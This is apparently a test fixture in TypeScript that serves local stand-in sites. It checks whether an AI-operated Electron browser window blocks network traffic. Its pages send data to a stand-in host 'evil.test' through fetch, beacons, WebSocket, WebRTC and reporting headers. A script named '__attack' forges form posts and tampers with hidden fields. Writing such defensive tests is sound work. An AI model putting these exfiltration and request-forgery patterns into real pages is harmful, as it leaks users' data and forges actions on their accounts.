// Local stand-ins for the sites of tests/browser-window-electron.test.ts. `op.test` (the operated
// site), `assets.test` (its parts host) and `untrusted.test` share one HTTPS server; `evil.test`,
// the place nothing may reach, has a server of its own so that every TCP connection to it counts
// (a preconnect or WebRTC's TCP opens one without any HTTP request), and a UDP socket stands for a
// STUN server. The harness maps the names to them with Chromium's `host-rules`.
import dgram from 'node:dgram'
import fs from 'node:fs'
import https from 'node:https'
import path from 'node:path'

export interface Hit { host: string; method: string; path: string; body: string }

const page = (udpPort: number) => `<!doctype html><meta charset="utf-8"><title>operated page</title>
<link rel="stylesheet" href="https://assets.test/a.css">
<link rel="preconnect" href="https://evil.test">
<link rel="dns-prefetch" href="https://evil.test">
<link rel="preload" as="fetch" href="https://evil.test/preload" crossorigin>
<script src="https://assets.test/a.js"></script>
<img src="https://assets.test/a.png">
<a id="popup" href="https://evil.test/popup" target="_blank">popup</a>
<a id="js" href="javascript:location='https://evil.test/js'">js</a>
<a id="nav" href="https://evil.test/nav">nav</a>
<a id="redirect-nav" href="/redirect-evil">redirect</a>
<a id="download" href="/file.csv" download>download</a>
<a id="download-evil" href="https://evil.test/file.csv" download>download elsewhere</a>
<form id="form" method="post" action="/ai-form"><input name="a" value="1"></form>
<script>
  // Everything below runs on load: none of it may reach evil.test, nor assets.test beyond its parts.
  fetch('https://evil.test/fetch?d=secret').catch(() => {})
  try { const x = new XMLHttpRequest(); x.open('GET', 'https://evil.test/xhr'); x.send() } catch {}
  new Image().src = 'https://evil.test/img'
  navigator.sendBeacon('https://evil.test/beacon', 'x')
  try { new WebSocket('wss://evil.test/ws') } catch {}
  const frame = document.createElement('iframe'); frame.src = 'https://evil.test/iframe'; document.body.appendChild(frame)
  const assetFrame = document.createElement('iframe'); assetFrame.src = 'https://assets.test/frame'; document.body.appendChild(assetFrame)
  fetch('https://assets.test/data.json').catch(() => {})
  fetch('https://assets.test/post', { method: 'POST', body: 'x', mode: 'no-cors' }).catch(() => {})
  fetch('/redirect-evil').catch(() => {})
  fetch('http://op.test/plain').catch(() => {})
  // WebRTC: STUN over UDP to an address, TURN over TCP to a name.
  try {
    const pc = new RTCPeerConnection({ iceServers: [
      { urls: 'stun:127.0.0.1:${udpPort}' },
      { urls: 'turn:evil.test:443?transport=tcp', username: 'u', credential: 'c' },
    ] })
    pc.createDataChannel('x')
    pc.createOffer().then(o => pc.setLocalDescription(o))
  } catch {}
</script>`

/**
 * A Lステップ-like reminder page (agent-browser.md "The runner"), in the shapes captured on the
 * real site: per message slot `openModal(<reminder>, <step>, <hole>, <template>, <type>)`, the step's
 * block `templateStep<step>`, hidden `_token` / `_lm_user_id`; the account in the header. Its script
 * tries everything a page could do while the AI operates (`__attack`): the same write by fetch and
 * XHR, an autosave on a timer, a read the run did not declare, and a form whose hidden fields it
 * changes and submits.
 */
const lstepPage = (steps: Record<string, string[]>) => {
  let hole = 700
  return `<!doctype html><meta charset="utf-8"><title>reminder</title>
<header><span class="account" data-account-id="ACC1">LINE ACC1</span></header>
<input type="hidden" name="_token" value="tok"><input type="hidden" name="_lm_user_id" value="u1">
${Object.entries(steps).map(([step, templates]) => `<div id="templateStep${step}">${templates.map(t => `<a onclick="openModal(101, ${step}, ${hole++}, ${t}, 1)">m</a>`).join('')}</div>`).join('\n')}
<form id="add" method="post" action="/line/episode/step/pack/template">
<input type="hidden" name="content_id" value="201"><input type="hidden" name="template_id" value="301">
<input type="hidden" name="_token" value="tok"><input type="hidden" name="_lm_user_id" value="u1"></form>
<script>
window.__attack = async () => {
  const body = 'content_id=201&template_id=301&_token=tok&_lm_user_id=u1'
  const form = { 'content-type': 'application/x-www-form-urlencoded' }
  const r = {}
  r.fetch = await fetch('/line/episode/step/pack/template', { method: 'POST', headers: form, body }).then(x => x.status, () => 'refused')
  r.xhr = await new Promise(res => { const x = new XMLHttpRequest(); x.open('POST', '/line/episode/step/pack/template'); x.setRequestHeader('content-type', form['content-type']); x.onload = () => res(x.status); x.onerror = () => res('refused'); x.send(body) })
  r.undeclaredRead = await fetch('/line/autosave-state').then(x => x.status, () => 'refused')
  // An autosave on a timer, for the second the AI operates before its own read (it stops by itself,
  // so it does not go on into the member's own browsing afterwards).
  const timer = setInterval(() => {
    fetch('/line/episode/step/pack/template', { method: 'POST', headers: form, body }).catch(() => {})
    fetch('/line/autosave', { method: 'POST', body: 'a=1' }).catch(() => {})
  }, 100)
  setTimeout(() => clearInterval(timer), 1000)
  // Hidden fields changed, then the form sent (after the timer had its turns).
  document.querySelector('#add [name=content_id]').value = '999'
  setTimeout(() => document.getElementById('add').submit(), 600)
  return r
}
</script>`
}

const WORKER = `fetch('/ai-worker', { method: 'POST', body: 'w' }).then(r => postMessage(r.status), () => postMessage('refused'))`

export interface Sites {
  hits: Hit[]
  /** The Lステップ-like site's state: step → attached template ids. */
  lstep: Record<string, string[]>
  /** TCP connections that reached evil.test's server (with or without an HTTP request). */
  evilConnections: number
  /** UDP datagrams that reached the STUN stand-in. */
  udpPackets: number
  close(): void
}

export async function startSites(certDir: string, ports: { site: number; evil: number; udp: number }): Promise<Sites> {
  const tls = { key: fs.readFileSync(path.join(certDir, 'key.pem')), cert: fs.readFileSync(path.join(certDir, 'cert.pem')) }
  const state: Sites = { hits: [], lstep: { 201: ['300'], 202: [] }, evilConnections: 0, udpPackets: 0, close: () => {} }
  const record = (req: import('node:http').IncomingMessage, body: string) =>
    state.hits.push({ host: (req.headers.host ?? '').split(':')[0], method: req.method ?? '', path: req.url ?? '/', body })

  const server = https.createServer(tls, (req, res) => {
    let body = ''
    req.on('data', chunk => { body += chunk })
    req.on('end', () => {
      record(req, body)
      const host = (req.headers.host ?? '').split(':')[0]
      const url = req.url ?? '/'
      if (host === 'op.test' && url === '/') {
        res.setHeader('content-type', 'text/html; charset=utf-8')
        // Reporting endpoints elsewhere: the window must neither keep them nor send to them.
        res.setHeader('Report-To', JSON.stringify({ group: 'g', max_age: 3600, endpoints: [{ url: 'https://evil.test/report' }] }))
        res.setHeader('NEL', JSON.stringify({ report_to: 'g', max_age: 3600, success_fraction: 1, failure_fraction: 1 }))
        res.setHeader('Reporting-Endpoints', 'e="https://evil.test/report2"')
        res.end(page(ports.udp))
        return
      }
      if (host === 'op.test' && url.startsWith('/api/episodes?')) {
        // A list the site's own pages read as JSON (Lステップ, design memo §36), behind the login.
        if (!/(^|;\s*)sid=1(;|$)/.test(req.headers.cookie ?? '')) { res.writeHead(302, { location: '/login' }); res.end(); return }
        res.setHeader('content-type', 'application/json')
        res.end(JSON.stringify({ current_page: 1, data: [{ id: 101, name: 'r', group_id: 29529 }], last_page: 1 }))
        return
      }
      if (host === 'op.test' && url.startsWith('/line/')) {
        // Logged in = the window's cookie; otherwise the login page, as a real site would.
        if (!/(^|;\s*)sid=1(;|$)/.test(req.headers.cookie ?? '')) { res.writeHead(302, { location: '/login' }); res.end(); return }
        if (req.method === 'GET' && url === '/line/episode/show/101') {
          res.setHeader('content-type', 'text/html; charset=utf-8')
          res.end(lstepPage(state.lstep))
          return
        }
        if (req.method === 'GET' && url === '/line/episode/show/103') {
          // Over the runner's 5 MiB: what a cut-short read would see first is padding only.
          res.setHeader('content-type', 'text/html; charset=utf-8')
          res.end(`<!-- ${'x'.repeat(6 * 1024 * 1024)} -->${lstepPage(state.lstep)}`)
          return
        }
        if (req.method === 'POST' && url === '/line/episode/step/pack/template') {
          // The write needs the cookie scoped to its own path, too.
          if (!/(^|;\s*)wp=1(;|$)/.test(req.headers.cookie ?? '')) { res.writeHead(401); res.end(); return }
          const form = new URLSearchParams(body)
          const step = form.get('content_id') ?? ''
          if (form.get('_token') !== 'tok' || !state.lstep[step]) { res.writeHead(419); res.end(); return }
          state.lstep[step].push(form.get('template_id') ?? '')
          // Template 999: applied, then the answer is lost.
          if (form.get('template_id') === '999') { req.socket.destroy(); return }
          res.writeHead(302, { location: '/line/episode/show/101' })
          res.end()
          return
        }
        res.end('ok')
        return
      }
      if (url === '/worker.js') { res.setHeader('content-type', 'text/javascript'); res.end(WORKER); return }
      if (url.startsWith('/redirect-evil')) { res.writeHead(302, { location: 'https://evil.test/redirected' }); res.end(); return }
      if (url === '/file.csv') { res.setHeader('content-type', 'text/csv'); res.setHeader('content-disposition', 'attachment; filename="file.csv"'); res.end('a,b'); return }
      if (url.endsWith('.css')) res.setHeader('content-type', 'text/css')
      else if (url.endsWith('.js')) res.setHeader('content-type', 'text/javascript')
      else if (url.endsWith('.png')) res.setHeader('content-type', 'image/png')
      res.setHeader('access-control-allow-origin', '*')
      res.end(url.endsWith('.js') ? 'window.assetScript = true' : 'ok')
    })
  })
  // A WebSocket handshake reaching the server counts as a hit; it is never accepted.
  server.on('upgrade', (req, socket) => { record(req, ''); socket.destroy() })

  const evil = https.createServer(tls, (req, res) => {
    let body = ''
    req.on('data', chunk => { body += chunk })
    req.on('end', () => { record(req, body); res.end('evil') })
  })
  evil.on('connection', () => { state.evilConnections++ })
  evil.on('upgrade', (req, socket) => { record(req, ''); socket.destroy() })
  evil.on('tlsClientError', () => {})

  const udp = dgram.createSocket('udp4')
  udp.on('message', () => { state.udpPackets++ })

  await Promise.all([
    new Promise<void>(resolve => server.listen(ports.site, '127.0.0.1', () => resolve())),
    new Promise<void>(resolve => evil.listen(ports.evil, '127.0.0.1', () => resolve())),
    new Promise<void>(resolve => udp.bind(ports.udp, '127.0.0.1', () => resolve())),
  ])
  state.close = () => { server.close(); evil.close(); udp.close() }
  return state
}
